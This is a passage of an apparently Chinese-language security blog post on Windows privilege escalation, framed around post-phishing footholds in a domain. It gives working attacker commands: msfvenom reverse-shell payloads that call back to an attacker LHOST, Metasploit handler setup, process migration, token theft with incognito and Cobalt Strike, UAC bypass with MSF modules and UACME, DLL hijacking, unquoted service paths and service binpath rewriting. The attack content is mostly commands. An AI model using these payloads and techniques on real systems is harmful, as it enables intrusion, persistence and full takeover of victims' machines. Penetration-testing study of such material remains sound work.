+<p><a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/MultiPotato">https://github.com/S3cur3Th1sSh1t/MultiPotato</a></p>
+<p>CandyPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/klezVirus/CandyPotato">https://github.com/klezVirus/CandyPotato</a></p>
+<p>RasmanPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/crisprss/RasmanPotato">https://github.com/crisprss/RasmanPotato</a></p>
+<p>PetitPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wh0amitz/PetitPotato">https://github.com/wh0amitz/PetitPotato</a></p>
+<p>JuicyPotatoNG</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a></p>
+<p>PrintNotifyPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/BeichenDream/PrintNotifyPotato">https://github.com/BeichenDream/PrintNotifyPotato</a></p>
+<p>CoercedPotato</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Prepouce/CoercedPotato">https://github.com/Prepouce/CoercedPotato</a></p>
+<h2 id="钓鱼成功场景"><a href="#钓鱼成功场景" class="headerlink" title="钓鱼成功场景"></a>钓鱼成功场景</h2><p>应用场景：</p>
+<p>1、常规某个机器被钓鱼后门攻击后，我们需要做更高权限操作或权限维持等。</p>
+<p>2、内网域中某个机器被钓鱼后门攻击后，我们需要对后续内网域做安全测试。</p>
+<p>比如计算机管理员用户执行了木马文件，上线后为adminnistrator权限，此时想看net user &#x2F;域名</p>
+<p>域内用户，但是计算机管理员权限不行，因为它属于计算机本机的管理员不算域内成员，此时要么升权限到system获取计算机系统权限，要么降低权限到域内用户</p>
+<p>主要当前技术入口点：</p>
+<p>-当前权限由钓鱼攻击获取</p>
+<p>主要当前技术应用点：</p>
+<p>-当前受控机在内网域环境</p>
+<p>1、提权system与内网交互</p>
+<p>2、降权到域用户与内网交互</p>
+<p>net user查看计算机用户</p>
+<p>net user &#x2F;domainname 查看域内用户</p>
+<p>cs内执行命令前面加shell </p>
+<p>shell net user </p>
+<h3 id="服务启动（提权）"><a href="#服务启动（提权）" class="headerlink" title="服务启动（提权）"></a>服务启动（提权）</h3><p>sc是用于与服务控制管理器和服务进行通信的命令行程序。</p>
+<p>适用版本：windows 7、10、08、12、16、19、22，早期用at命令</p>
+<p>1、创建一个名叫syscmd的执行文件服务</p>
+<p>sc Create syscmd binPath&#x3D;”c:\msf.exe” </p>
+<p>2、运行服务</p>
+<p>sc start syscmd</p>
+<p>#远程控制（提权）</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>
+<p>psexec.exe -accepteula -s -i -d cmd #调用运行cmd</p>
+<p>#进程注入（降权&amp;提权）</p>
+<p>举例：win系统中任务管理器，有两个进程exe，a进程用户为administrator,b进程为system（权限高），a进程注入b进程，变成system，提权；b进程注入a进程，变成administrator，降权</p>
+<p><font style="color:#000000;">MSF：<br></font>利用前面讲的溢出漏洞，</p>
+<p><font style="color:#000000;">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.139.141 LPORT&#x3D;3333 -f exe -o msf.exe<br></font>生成的msf.exe在&#x2F;root目录下</p>
+<p>在启动msfconsole监听端口</p>
+<p>攻击机msfconsole配置监听会话</p>
+<p>use exploit&#x2F;multi&#x2F;handler</p>
+<p>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</p>
+<p>set lhost 0.0.0.0</p>
+<p>set lport 3333</p>
+<p>exploit</p>
+<p>在监听端口拿到的shell</p>
+<p>ps &#x2F;&#x2F;查看进程</p>
+<p>migrate PID &#x2F;&#x2F;迁移对应PID</p>
+<p>从msf.exe开始迁移到PID</p>
+<p>此时再getuid就获取到迁移的PID的User权限了了</p>
+<p>CS:&#x2F;&#x2F;普通用户注入进程和窃取都没办法执行，至少得administrator</p>
+<p>ps &#x2F;&#x2F;查看进程</p>
+<p>inject PID &#x2F;&#x2F;注入对应PID</p>
+<p>#令牌窃取（降权&amp;提权）</p>
+<p>MSF：</p>
+<p>use incognito</p>
+<p>list_tokens -u</p>
+<p>获取到能窃取的用户，其中里面有NT AUTHORITY\SYSTEM</p>
+<p>impersonate_token “NT AUTHORITY\SYSTEM”</p>
+<p>也可以直接输入getsystem命令提权，msf会自动尝试可使用的方式提权</p>
+<p>CS:</p>
+<p>ps &#x2F;&#x2F;查看进程</p>
+<p>steal_token PID &#x2F;&#x2F;窃取进程令牌</p>
+<p>spawnu PID &#x2F;&#x2F;窃取进程令牌上线</p>
+<h3 id="Win10-11-BypassUAC自动提权-MSF-UACME"><a href="#Win10-11-BypassUAC自动提权-MSF-UACME" class="headerlink" title="Win10&amp;11-BypassUAC自动提权-MSF&amp;UACME"></a>Win10&amp;11-BypassUAC自动提权-MSF&amp;UACME</h3><p>UAC-&gt;User account controller</p>
+<p>在某些win系统中，运行exe需要点击弹出窗口的是或者否选择运行或者不允许软件</p>
+<p>类似下面这种</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724723287835-c789085c-1f46-4e5a-acae-971eb076a0a4.png"></p>
+<p>直接在cmd窗口里面执行会显示拒绝访问</p>
+<p>为了远程执行目标的exe或者bat可执行文件需要绕过此安全机制</p>
+<p>在用户到系统权限自动提权中也学通过BypassUAC实现自动化提权</p>
+<p>绕过项目：MSF内置，Powershell渗透框架，UACME项目(推荐)</p>
+<p>开启UAC和未开启UAC时,CS&#x2F;MSF默认getsystem提权影响(进程注入等)</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx lport&#x3D;xx -f exe -o msf.exe</p>
+<p>1、MSF模块：</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;ask</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassua</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_sluihijack</p>
+<p>use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_silentcleanup</p>
+<p>2、UACME项目：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
+<p>Akagi64.exe 编号 调用执行</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724721100788-beeafb14-f9a1-4ca7-a1ef-76ca17586089.png"></p>
+<p>如果运行有问题尝试修改SDK版本解决</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724721550529-1d7a65b0-66f8-4bc1-bea0-326390c5661d.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726525834-a177585e-6efc-4bb5-948c-cb08e05647b1.png"></p>
+<p>对这五个全部修改</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726559654-aede9dff-e5d8-47d3-82f9-b78024b8190e.png"></p>
+<p>生成</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726678655-257bd3c8-5337-4ee5-af81-af355857d890.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724726704612-951ea142-10e7-4461-a25e-7e3376691cc0.png"></p>
+<p>利用文件在下面文件夹的output文件夹下</p>
+<p>取出来拿到要绕过UAC的机器上，Akagi64.exe 数字编号 要绕过的软件.exe</p>
+<p>eg：Akagi64.exe 41 C:\test\msf.exe</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724727739945-5c40f1c3-83d6-4cd3-ac38-036f7ce5a6a3.png"></p>
+<p>再msf提权或者其他执行类提权时候命令行执行有可能卡住，就可能是UAC导致</p>
+<h3 id="Windows-DLL劫持提权应用配合MSF-FlashFXP"><a href="#Windows-DLL劫持提权应用配合MSF-FlashFXP" class="headerlink" title="Windows-DLL劫持提权应用配合MSF-FlashFXP"></a>Windows-DLL劫持提权应用配合MSF-FlashFXP</h3><p>原理：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p>
+<p>1、应用程序加载的目录</p>
+<p>2、C:\Windows\System32</p>
+<p>3、C:\Windows\System</p>
+<p>4、C:\Windows</p>
+<p>5、当前工作目录Current Working Directory，CWD</p>
+<p>6、在PATH环境变量的目录（先系统后用户）</p>
+<p>过程：信息收集-进程调试-制作dll并上传-替换dll-等待启动应用成功</p>
+<p>检测：ChkDllHijack 火绒剑</p>
+<p>项目：<a target="_blank" rel="noopener" href="https://github.com/anhkgg/anhkgg-tools">https://github.com/anhkgg/anhkgg-tools</a></p>
+<p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p>
+<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx lport&#x3D;xx -f dll -o xiaodi.dll</p>
+<p>提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用</p>
+<h3 id="Windows-不带引号服务路径配合MSF-MacroExpert"><a href="#Windows-不带引号服务路径配合MSF-MacroExpert" class="headerlink" title="Windows-不带引号服务路径配合MSF-MacroExpert"></a>Windows-不带引号服务路径配合MSF-MacroExpert</h3><p>前提：需要上传到指定目录的权限</p>
+<p>原理：服务路径配置由于目录空格问题，可上传文件配合解析恶意触发执行</p>
+<p>路径带空格且没被双引号闭合</p>
+<p>过程：检测服务权限配置-制作文件并上传-服务路径指向解析-等待调用成功</p>
+<p>检测命令：</p>
+<p>wmic service get name,displayname,pathname,startmode |findstr &#x2F;i “Auto” |findstr &#x2F;i &#x2F;v “C:\Windows\“ |findstr &#x2F;i &#x2F;v “””</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1724738357707-0c37fa9a-5cb7-4447-880f-4d552fec6bb7.png"></p>
+<p>上传反弹exe，设置好对应执行名后，执行sc start “Macro Expert”</p>
+<p>就比如有一个服务的启动是C:\program files\xx.exe</p>
+<p>此时上传C:\program.exe，服务就会找到他，把后面空格之后的当作参数</p>
+<h3 id="Win2012-不安全的服务权限配合MSF-NewServices"><a href="#Win2012-不安全的服务权限配合MSF-NewServices" class="headerlink" title="Win2012-不安全的服务权限配合MSF-NewServices"></a>Win2012-不安全的服务权限配合MSF-NewServices</h3><p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</p>
+<p>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p>
+<p>检测脚本：accesschk.exe -uwcqv “administrator” *</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p>
+<p>修改test服务指向Program.exe</p>
+<p>sc config “test” binpath&#x3D; “C:\Program.exe”</p>
+<p>sc start test</p>
+<p>实战中基本没有，webshell没有权限执行那个工具，需要高权限</p>
+<h3 id="综合类检测项目："><a href="#综合类检测项目：" class="headerlink" title="综合类检测项目："></a>综合类检测项目：</h3><p><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
+<p>类似对整机进行基线检查</p>
+<p>PEAS-ng适用于Windows和Linux&#x2F;Unix*和MacOS的权限提升工具。</p>
+<p>winPEAS.bat &gt; result.txt</p>
+<p>winPEASany.exe log&#x3D;result.txt</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">基础点：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%BA%94%E7%94%A8-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">Web应用&amp;中间件&amp;数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E8%BD%AC%E7%A7%BB-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86-Web"><span class="toc-number">2.2.</span> <span class="toc-text">权限转移-后台管理&amp;数据库管理&amp;Web</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows"><span class="toc-number">3.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%88%B0Win-%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF-%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">3.1.</span> <span class="toc-text">Web到Win-系统提权-宝塔面板-哥斯拉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%88%B0Win-%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-MSF-CS"><span class="toc-number">3.2.</span> <span class="toc-text">Web到Win-系统提权-溢出漏洞-MSF&amp;CS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%88%B0Win-%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-%E4%BA%BA%E5%B7%A5%E6%93%8D%E4%BD%9C"><span class="toc-number">3.3.</span> <span class="toc-text">Web到Win-系统提权-人工操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%88%B0Win-%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83-%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F"><span class="toc-number">3.4.</span> <span class="toc-text">Web到Win-系统提权-土豆家族</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%88%90%E5%8A%9F%E5%9C%BA%E6%99%AF"><span class="toc-number">3.5.</span> <span class="toc-text">钓鱼成功场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%EF%BC%88%E6%8F%90%E6%9D%83%EF%BC%89"><span class="toc-number">3.5.1.</span> <span class="toc-text">服务启动（提权）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Win10-11-BypassUAC%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83-MSF-UACME"><span class="toc-number">3.5.2.</span> <span class="toc-text">Win10&amp;11-BypassUAC自动提权-MSF&amp;UACME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-DLL%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83%E5%BA%94%E7%94%A8%E9%85%8D%E5%90%88MSF-FlashFXP"><span class="toc-number">3.5.3.</span> <span class="toc-text">Windows-DLL劫持提权应用配合MSF-FlashFXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E9%85%8D%E5%90%88MSF-MacroExpert"><span class="toc-number">3.5.4.</span> <span class="toc-text">Windows-不带引号服务路径配合MSF-MacroExpert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Win2012-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E5%90%88MSF-NewServices"><span class="toc-number">3.5.5.</span> <span class="toc-text">Win2012-不安全的服务权限配合MSF-NewServices</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E7%B1%BB%E6%A3%80%E6%B5%8B%E9%A1%B9%E7%9B%AE%EF%BC%9A"><span class="toc-number">3.5.6.</span> <span class="toc-text">综合类检测项目：</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&text=windows权限提升"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&is_video=false&description=windows权限提升"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=windows权限提升&body=Check out this article: https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&title=windows权限提升"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&name=windows权限提升&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/09/29/%E5%86%85%E7%BD%91/windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/&t=windows权限提升"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
